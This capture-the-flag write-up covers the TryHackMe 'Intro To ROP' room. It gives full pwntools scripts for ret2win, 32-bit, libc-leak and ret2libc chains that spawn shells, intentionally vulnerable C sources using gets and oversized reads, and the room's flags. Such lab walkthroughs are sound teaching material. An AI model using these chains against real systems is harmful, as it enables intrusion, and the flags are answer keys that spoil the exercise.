# Intro To ROP
This room is created by [DiZma](https://tryhackme.com/p/DiZma) and is an introduction to `rop` or `return oriented programming` wherein one uses a series of returns to different functions to do, among other things, access priviledge-enclosed files, `flag.txt`, or certain functions. 

## Task 3 - First ROP
We inspect the files that are in the `~\first_rop` directory. Running a `checksec` on `three_locks` gives us a pretty vulnerable binary.
```console
buzz@intro2rop:~/first_rop$ checksec three_locks
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/buzz/first_rop/three_locks'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
With [`NX enabled`](https://en.wikipedia.org/wiki/NX_bit), the binary does not allow us to both write or execute on memory, `stack`. This feature is the thus called `write XOR execute`. 
Because of this, `ROP` is needed wherein we use operands, or `gadgets`, within the binary itself to execute. Which gadgets are useful, can we understand through looking at the `three_locks.c` source code.
```C
#include <stdio.h>
// global variables
FILE *fp; // file pointer
char buffer[255]; //buffer to hold flag data

void lock1(int key){
	if (key == 5){
		fp = fopen("flag.txt", "r");
		printf("Lock 1 unlocked!\n");
	}
	else {
		printf("Sorry, lock 1 was not opened.");
	}
	return;
}

void lock2(int key1, int key2){
	if (key1 == 42 && key2 == 1776) {
		fgets(buffer, 255, fp);
		printf("Lock 2 unlocked!\n");
	}
	else {
		printf("Sorry, lock 2 was not opened.");
	}
	return;
}
void lock3() {
	printf("Lock 3 is a gimmie. If you get the other 2, this should work.\nHere is you flag (hopefully):\n");
	printf("%s\n", buffer);
}

void start(){
	char name[24];
	gets(name);
//	lock1(5);
//	lock2(42, 1776);
//	lock3();
	return;
}

int main() {
	printf("We need to unlock 3 locks to print the flag!\n");
	start();
	return 0;
}
```
Reading through the code, we can understand that bypassing the three locks is the key to be able to see the flag. In `lock1`, an argument is needed that is checked against `5`, while `lock2` requires two arguments. Running a simple `ret` to `lock3()` isn't going to cut it. Now, we need a deeper understanding of ROP to be able to manipulate the input in these functions' arguments. Luckily, given some thinking, gadgets such as `pop rdi; ret` allow us to pass arguments to these functions. `rdi`, `rsi`, and `rdx` are among the registers that handle functional arguments. You can read more [here](https://web.stanford.edu/class/archive/cs/cs107/cs107.1222/guide/x86-64.html).

In fact, this is enough to start writing our exploit. Here is the exploit that I used:
```python
from pwn import *

context.update(arch='amd64', os='linux')
p = process("./three_locks")

#useful locations
lock1 = 0x400607
lock2 = 0x400654
lock3 = 0x4006ae
pop_rdi = 0x0000000000400773
pop_rsi_r15 = 0x0000000000400771

#payload construction (ropping)
payload = cyclic(cyclic_find("kaaa")) #overflow the buffer into ret address
payload += p64(pop_rdi) #jump to first gadget and pop the stack's next value into rdi
payload += p64(5)
payload += p64(lock1) #jump to lock1
payload += p64(pop_rdi) #pop stack's value into rdi 
payload += p64(42)
payload += p64(pop_rsi_r15) #into rsi and r15 
payload += p64(1776)
payload += p64(0xdeadbeef) #dummy value
payload += p64(lock2)
payload += p64(lock3)

p.sendline(payload)
p.interactive()
```

The address for `pop rdi; ret` was found by typing in the console `ropper -f <target> --search "<desire operand>"`. In the case for `pop rsi`, the only found instance is with the local variable `r15`. This is why a dummy value was passed for this. 

In total, what the ROP-chain does is this:
1. `cyclic_find` gives us the location of the `ret` address, allowing us to manipulate the return address.
2. `ret` first jumps to `pop rdi` which then `pops` the first value on the stack `into rdi`. In this case, after the `pop_rdi` address in the payload is `5`.
3. next instruction then moves to `lock1` with that `rdi` argument of `5`, bypassing the lock
4. we do the same as 2. but pop for `rdi` and `rsi` with `42` and `1776` sequentially, before calling `lock2`
5. at this point, we have bypassed the two locks and can now print the flag.

Using the script above, we get the flag:

```console
buzz@intro2rop:~/first_rop$ python3 exploit.py
[+] Starting local process './three_locks': pid 12219
[!] cyclic_find() expected a 4-byte subsequence, you gave b'kaa'
    Unless you specified cyclic(..., n=3), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=3) to override this.
[*] Switching to interactive mode
We need to unlock 3 locks to print the flag!
Lock 1 unlocked!
Lock 2 unlocked!
Lock 3 is a gimmie. If you get the other 2, this should work.
Here is you flag (hopefully):
flag{F1r5t_ROP_c0mpl3t3}
```
## Task 4 - ROP with 32-bit binary
Of course, with a binary accustomed to a different computer architecture, the registers, operands, and the way we do ROP change a little. The changes aren't that too big from `Task 3`. Instead of searching for `pop rdi` using `ropper` in `amd64` or in `64-bit` computers, we only need a `pop` instruction. `i386` does not use registers for functional arguments as the task above demonstrates. 

To find addresses of the lock functions, use `gdb` with `p lock1` etc. This should print the address. As usual, for the `ret` address initially, one must use a cyclic input to identify this padding. You can run `cyclic 100 > find` then `gdb <target>` on the terminal and `r < find` on gdb. This should give us an idea of the padding. Using `pwndbg` or `gef` to enchance your exploit development phase is invaluable.

Our script from before can be adjusted as below.

```python
from pwn import *

context.update(arch='i386', os='linux')
p = process("./three_locks_32")

#useful locations
lock1 = 0x8048506
lock2 = 0x804856d
lock3 = 0x80485da
pop_ret = 0x08048361 #pop ebx; ret 

#payload construction (ropping)
payload = cyclic(cyclic_find("jaaa")) #overflow right before the ret address
payload += p32(lock1) #jump to lock1, it doesn't neet 'rdi', it immediately looks for function arguments below next value of stack 
payload += p32(pop_ret) #ret after lock1
payload += p32(5) #first argument
payload += p32(lock2) #5 is popped, the next return or jump is to lock2
payload += p32(lock3) #return after lock2
payload += p32(42) #first argument
payload += p32(1776) #second argument

p.sendline(payload)
p.interactive()
```

Running our exploit yields the result below.

```console
buzz@intro2rop:~/32_rop$ python3 exploit.py
[+] Starting local process './three_locks_32': pid 12391
[*] Switching to interactive mode
We need to unlock 3 locks to print the flag!
Lock 1 unlocked!
Lock 2 unlocked!
Lock 3 is a gimmie. If you get the other 2, this should work.
Here is you flag (hopefully):
flag{Thr33_Tw0_D0N3}
```
## Task 5 - libc
In this task, we are not given a `win()` function but rather the buffer overflow vulnerability itself. We need to find another way to be able to run `cat flag.txt` in this directory. The permissions are set for this file by the same user `leaked_lib` binary runs on when executed. By gaining a `shell` on this binary, we can access the flag. A way to spawn a shell is using in-built commands present in the binary; those commands lie in `libc`. In particular, `/bin/sh` is of particular interest. 

We are given a source code, `leaked_lib.c`, with contents:
```C
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void start() {
  printf("Use me to read flag.txt!\n");

  char buf[32];
  memset(buf, 0, sizeof(buf));
  read(0, buf, 256);
}

void leaky(){
	void *self = dlopen(NULL, RTLD_NOW);
	printf("printf() location: %p leak!\n", dlsym(self, "printf"));
}

int main()
{
  start();

  return 0;
}
```
We see that the address of `printf` is leaked by the `leaky()` function. Jumping into this function can give us `printf`s address which is helpful in determining `libc`s address. Running `p leaky` in `gdb` gives us the address `0x80485b9`. Great! Now, we need to know what `libc` path is used in the binary so that we can use this using `pwntools`. Running `info proc map` gives us the path `/lib/i386-linux-gnu/libc-2.27.so`. 

We now have all we need to create our payload:

```python
from pwn import *

context.update(arch='i386', os='linux')

p = process("./leaked_lib")

#useful locations
leaky = 0x80485b9
start = 0x8048566

#rop exploit
payload = cyclic(cyclic_find('laaa'))
payload += p32(leaky)
payload += p32(start) # go back to the start to continue returning

p.sendline(payload)

recv_data = p.recvuntil("leak!")
printf_addr = recv_data[44:54] # extract ONLY the leaked printf_address from the printed result of leaky()

libc = ELF("/lib/i386-linux-gnu/libc-2.27.so") 
printf_offset = libc.sym.printf
libc_base = int(printf_addr, 16) - printf_offset
libc.address = libc_base # find the location of libc

bin_sh = next(libc.search(b'/bin/sh')) # find the command to spawn the shell in libc
rop = ROP(libc) # create our ROP chain
rop.setreuid(1005, 1005) # ensure that the wanted user is the real user and effective user when we spawn the shell
rop.system(bin_sh)
rop.exit(0)

payload2 = cyclic(cyclic_find("laaa"))
payload2 += rop.chain()
p.sendline(payload2)

p.interactive()
```
Using the exploit above, we are able to `pwn` the machine and get the flag!

```console
buzz@intro2rop:~/leaked_lib$ python2 exploit.py
[+] Starting local process './leaked_lib': pid 12020
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/lib/i386-linux-gnu/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
('address of libc:', '0xf7d6e000')
('location of system:', '0xf7dab3d0')
[*] Loading gadgets for '/lib/i386-linux-gnu/libc-2.27.so'
[*] Switching to interactive mode

Use me to read flag.txt!
$ ls
att  exploit.py  flag.txt  leaked_lib  leaked_lib.c
$ cat flag.txt
flag{l34k_2_pwn}
```

## Task 6 - final ret2libc

Unlike the previous task, this task had no leaky function with almost the same sourc code which necessitates another way to determine `libc`s address. `PLT`, procedure linkage table, and `GOT`, global offset table, are those ways. By typing `plt` and `got` in gdb for the `final` library, we obtain the addresses for the `puts` function: `0x400460` and `0x601018`.

The exploit becomes:

```console
buzz@intro2rop:~/final$ ropper -f final --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: final
0x0000000000400633: pop rdi; ret; 
```

```python
from pwn import *

context.update(arch='amd64', os='linux')

#useful locations
elf = ELF("./final")
plt_puts = 0x400460
got_puts = 0x601018
start = 0x400577

rop = ROP(elf)
pop_rdi = rop.rdi.address
rop.raw(pop_rdi)
rop.raw(got_puts)
rop.raw(plt_puts)
 

p = process("./final")

#ROP exploit
payload  = cyclic(cyclic_find('kaaa'))
payload += rop.chain() 
payload += p64(start)

p.sendline(payload)

print(p.recvline())
leak_data = p.recv(6)
puts_addr = unpack(leak_data, "all")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
puts_offset = libc.sym.puts
libc_base = puts_addr - puts_offset
libc.address = libc_base
bin_sh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.setreuid(1006, 1006)
rop.system(bin_sh)
rop.exit(0)

payload2 = cyclic(cyclic_find('kaaa'))
payload2 += rop.chain()

p.sendline(payload2)
p.interactive()
```
```console
buzz@intro2rop:~/final$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/buzz/final/final'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './final'
[+] Starting local process './final': pid 12475
Use me to read flag.txt!

[!] Could not populate PLT: cannot import name arm_const
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Traceback (most recent call last):
  File "exploit.py", line 35, in <module>
    bin_sh = next(libc.search(b'/bin/sh/'))
StopIteration
[*] Stopped process './final' (pid 12475)
buzz@intro2rop:~/final$ vim exploit.py
buzz@intro2rop:~/final$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/buzz/final/final'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './final'
[+] Starting local process './final': pid 12494
Use me to read flag.txt!

[!] Could not populate PLT: cannot import name arm_const
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/lib/x86_64-linux-gnu/libc-2.27.so'
[*] Switching to interactive mode

Use me to read flag.txt!
$ whoami
final
$ ls
exploit.py  final  final.c  flag.txt
$ cat flag.txt
flag{V1ct0ry!}
```


